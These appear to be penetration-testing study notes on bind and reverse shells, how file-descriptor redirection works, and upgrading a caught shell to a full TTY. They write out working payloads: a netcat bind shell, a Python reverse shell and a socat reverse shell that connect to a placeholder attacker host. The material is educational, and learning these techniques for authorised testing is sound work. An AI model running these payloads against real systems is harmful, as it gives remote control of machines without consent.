# Overview

## The Pentesting Framework Context
Reverse shells are part of the **infiltration/getting shell** step in penetration testing. By this point, you've already:
- Identified and exploited a vulnerability
- Achieved **Remote Code Execution (RCE)** on the target

## What is RCE?
**Remote Code Execution (RCE)** means you can make the target machine execute arbitrary code. However, RCE alone might only allow:
- Running single commands blindly
- Limited, non-interactive access
- Difficult command chaining

This is where it becomes practical to get a shell you can execute from. A shell provides:
- Interactive access: Type commands and see results in real-time
- Persistent session:  Stay connected without re-exploiting
- Full control:  Navigate filesystem, run programs, edit files
- Easier operations: Much more practical than one-off RCE

# Getting Shell

## What Does "Getting Shell" Mean?
"Getting shell" means obtaining an interactive command-line interface (shell) on the target machine:
On **Linux/Unix**, this means `/bin/bash` or `/bin/sh` or other distro-specific shells
On **Windows**, this means running `cmd.exe`or `powershell.exe`

This gives you a command prompt where you can execute commands and see output interactively.

## SSH: The Legitimate Method

**SSH (Secure Shell)** is the standard, legitimate way to get shell access. It uses encrypted connection, requires authentication (username/password or keys), typically runs on port 22, and is a backbone of remote administration.

SSH is almost always available, but it's generally not a great target if you don't have the credentials, firewalls block access to it, or the target is a web server or something without SSH. In these cases, we need alternative methods to obtain shell access after achieving RCE.

# Bind Shells

## What is a Bind Shell?
A **bind shell** is when the target machine opens a port and listens for incoming connections. 
You use your RCE exploit to set up a listener, and you use your machine to connect to it and get shell through the connection.

```
Attacker Machine                    Target Machine
     |                                    |
     |                              Opens port 4444
     |                              Listens for connection
     |                                    |
     |  ---- Connects to port 4444 ---->  |
     |                                    |
     |  <------- Shell access --------    |
```

## Simple Example

**On target** (via RCE):
```bash
nc -lvnp 4444 -e /bin/bash
```

**On your machine**:
```bash
nc target_ip 4444
```

## Why Bind Shells Are Impractical

### Firewall Blocking
Firewalls typically operate with these rules:
- Incoming connections== deny by default==, allow specific ports (whitelist approach)
- Outgoing connections ==allow by default==, deny specific destinations (blacklist approach)

**Even if you successfully open a listener on the target**, the firewall (which sits in front of the machine) will still drop incoming packets according to its rules. In this case, your bind shell on port 4444 gets blocked at the firewall level before packets even reach your listener.

### Why Firewalls Allow This Asymmetry
**Incoming connections** (strict):
- Could be anyone on the internet
- Potential attackers trying to access services
- Must be explicitly allowed

**Outgoing connections** (lenient):
- Initiated by internal users/applications
- Needed for normal operations (web browsing, API calls, updates)
- Blocking would break legitimate functionality

# Reverse Shells

## The Core Concept
A **reverse shell** inverts the normal client-server relationship. Instead of you connecting to the target, the target connects back to you. Since outgoing connections are typically allowed by firewalls, the target can initiate a connection to your machine. This bypasses the firewall's incoming connection restrictions.

### The Flow

```
Attacker Machine                    Target Machine
     |                                    |
Sets up listener on port 4444             |
Waiting for connection                    |
     |                                    |
     |  ---- Use RCE to start shell ----> |
     |  <---- Connects to attacker ------ | (Outgoing connection)
     |                                    |
     |  ------- Shell commands ---------> |
     |  <------ Command output ---------- |
```
*The target initiates the connection (outgoing traffic), which firewalls typically permit.*

## How Reverse Shells Work Technically
Every reverse shell follows three fundamental steps:

### 1. Set Up Listener (Your Machine)
Before exploiting, start listening for incoming connections. Here's a basic example with **netcat:**

```bash
nc -lvnp 4444
```

- `nc` = netcat (networking utility)
- `-l` = listen mode
- `-v` = verbose output
- `-n` = no DNS lookup
- `-p 4444` = listen on port 4444

**What this does**: Creates a TCP listener waiting for the target to connect back.

### 2. Send Payload to Target
Using your RCE capability, execute code on the target that does three things:

1. Opens a network connection to your IP and port

```python
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("attacker_ip", 4444))
```

2. Redirects standard input/output/error to the network socket **(UNIX SPECIFIC)**

```python
os.dup2(s.fileno(), 0)  # stdin
os.dup2(s.fileno(), 1)  # stdout
os.dup2(s.fileno(), 2)  # stderr
```

3. Spawns a shell process

```python
subprocess.call(["/bin/bash", "-i"])
```

> [!question]- Why redirect first before spawning shell?
> Child processes inherit file descriptors from their parent. When you spawn the shell, it automatically inherits the redirected descriptors.
> ```python
> # 1. Create and connect socket
> s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
> s.connect(("attacker_ip", 4444))
> 
> # 2. Redirect file descriptors to socket
> os.dup2(s.fileno(), 0)  # Now stdin points to socket
> os.dup2(s.fileno(), 1)  # Now stdout points to socket
> os.dup2(s.fileno(), 2)  # Now stderr points to socket
> 
> # 3. Spawn shell - it inherits the redirected descriptors
> subprocess.call(["/bin/bash", "-i"])
> ```
> 
> If you spawned the shell first, it would inherit normal stdin/stdout/stderr (from the exploited service or terminal), and redirecting them afterward would be much more difficult.

### 3. Interact with the Shell
Once connected, the target's shell is now controlled through your listener:
- Commands you type → sent over network → executed on target
- Output from target → sent over network → displayed on your machine

## Why TCP?
TCP is used because it:
1. Guarantees packet delivery
2. Ensures the correct order
3. Confirms reciept of data

You want these three things because if you type commands, and they are lost or sent out of order, unpredictable behavior happens on the shell

## Understanding File Descriptors

### What Are File Descriptors?
**File descriptors** are integers that represent open "files" (in Unix, almost everything is a file: actual files, network sockets, pipes, devices).

### The Standard Three
Every process starts with three file descriptors:
**0 = stdin** (standard input) - where the process reads input
**1 = stdout** (standard output) - where the process writes normal output
**2 = stderr** (standard error) - where the process writes error messages

### Normal Shell Behavior

```
Terminal → stdin (0) → bash → stdout (1) → Terminal
                            → stderr (2) → Terminal
```

You type in the terminal → bash reads from stdin → bash writes to stdout → you see output in terminal

### Reverse Shell Behavior

```
Network socket ← stdin (0) ← bash → stdout (1) → Network socket
                                 → stderr (2) → Network socket
```

All three file descriptors point to the network socket instead of a terminal. The shell is "blind" to where its I/O actually goes.

## Why So Many Different Payloads?

Each payload assumes different things are available on the target:

- Is Python installed? → Use Python payload
- Is netcat available? → Use nc payload
- Only basic bash? → Use bash redirections
- PHP web server? → Use PHP socket functions
- Windows without PowerShell? → Use VBScript or compiled .exe

When pentesting, you:

1. Identify what's installed on the target
2. Choose the appropriate payload
3. Sometimes need the shortest possible one-liner if RCE is limited

## Operating System Differences

### Linux/Unix Payloads
- Use `/bin/bash`, `/bin/sh`
- Leverage Unix file descriptor manipulation
- Common tools: Python, Perl, netcat, bash

### Windows Payloads
- Use `cmd.exe` or `powershell.exe`
- Different networking APIs (Windows Sockets)
- Common tools: PowerShell, VBScript, compiled executables

# Getting TTY
## What is a TTY?
**TTY** (TeleTYpewriter) is a terminal interface that provides full shell functionality. Originally referring to physical terminals, TTY now means a proper terminal environment with:

- Line editing (backspace, arrow keys work correctly)
- Job control (Ctrl+C, Ctrl+Z, background/foreground processes)
- Proper signal handling
- Screen control (clear screen, colors, cursor positioning)
- Tab completion
- Command history

---
## The Problem: Non-Interactive Shells
When you first get a reverse shell, you typically have a **basic/dumb shell** with significant limitations:

```bash
# Interactive programs fail
su root
# Error: su: must be run from a terminal

sudo -l
# Error: sudo: no tty present and no askpass program specified

# Text editors break
nano file.txt
# Weird display, broken interface

vim file.txt
# Doesn't work properly

# SSH from compromised machine fails
ssh user@another-host
# Error: Pseudo-terminal will not be allocated

# Ctrl+C kills your ENTIRE connection
^C
# Connection terminated - you lose access!

# Arrow keys print garbage
^[[A^[[B^[[C^[[D

# No tab completion
# No command history
```

---
## The Three Levels of Shell

### 1. Non-Interactive Shell (Basic Reverse Shell)
- Can run simple commands
- No job control
- Can't run interactive programs
- Ctrl+C kills connection
- Arrow keys don't work
### 2. Interactive Shell (Basic TTY)
- Can run interactive programs (su, sudo)
- Basic terminal functionality
- Some features still broken (terminal size, Ctrl+C handling)
### 3. Fully Interactive Shell (Full TTY)
- Everything works like SSH
- Proper terminal size
- All keyboard shortcuts work
- Full-screen applications work (vim, htop, less)
- Stable and reliable

---
## Upgrading to Full TTY
### The Standard Upgrade Process
Spawn a PTY (Pseudo-Terminal)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Alternatively

```bash
script /dev/null -c bash
```

This creates a pseudo-terminal, which makes programs think they're running in a real terminal.

Press **Ctrl+Z** to suspend the reverse shell:

```bash
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.10.10] from (UNKNOWN) [10.10.10.50] 45678

www-data@target:/$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@target:/$ ^Z
[1]+  Stopped                 nc -lvnp 4444
```

### Configure Your Local Terminal

```bash
stty raw -echo; fg
```

Then press **Enter** twice.

**What this does**:
- `stty raw` = pass all keystrokes directly without local processing
- `-echo` = don't echo characters locally (let the remote shell do it)
- `fg` = bring the reverse shell back to foreground

Reinitialize the Remote Terminal

```bash
reset
```

Or set the terminal type:

```bash
export TERM=xterm-256color
```

Set Terminal Size

First, check your local terminal size:

```bash
stty size
# Output example: 24 80
```

Then set it on the target:

```bash
stty rows 24 cols 80
```

Replace `24` and `80` with your actual terminal dimensions.

### Quick Reference: Full Upgrade

```bash
# On target (after getting initial shell):
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Press Ctrl+Z

# On your local machine:
stty raw -echo; fg

# Press Enter twice

# On target:
export TERM=xterm-256color
stty rows 24 cols 80
```

---
## What's Actually Happening

```
Your Terminal → Network → Target Shell (no TTY)
                               ↓
                          Spawns PTY
                               ↓
                          PTY → bash (thinks it's in a real terminal)
```

A **PTY (Pseudo-Terminal)** is a kernel feature that emulates a real terminal device.

---
## Why Each Step Matters

**`python3 -c 'import pty; pty.spawn("/bin/bash")'`**
- Creates the PTY device
- Spawns a new bash that's connected to the PTY

**`stty raw -echo`**
- `raw`: Your terminal passes every keystroke directly (including Ctrl+C) to the remote shell
- `-echo`: Prevents double-echoing of characters

**`fg`**
- Returns the backgrounded shell to foreground with new settings applied

**`reset` or `export TERM=xterm-256color`**
- Tells programs what terminal type to emulate
- Enables proper colors and screen control

**`stty rows X cols Y`**
- Sets the terminal dimensions
- Prevents line wrapping issues
- Makes full-screen applications work correctly

---
## Alternative Methods

### Using `socat` (More Advanced)

If `socat` is available on both machines:

**On your machine**:
```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

**On target**:
```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker_ip:4444
```

This creates a full PTY automatically without manual upgrading steps.

### Using `expect` (If Available)

```bash
expect -c 'spawn /bin/bash; interact'
```

## Common Issues and Fixes

### Shell Keeps Breaking on Ctrl+C
Make sure you ran `stty raw -echo` on your local machine.

### Weird Characters or Broken Display
Set the correct TERM variable:

```bash
export TERM=xterm-256color
```

### Lines Wrapping Incorrectly
Set the correct terminal size with `stty rows X cols Y`.

### Can't Background Processes
Ensure you have a proper PTY spawned (Step 1).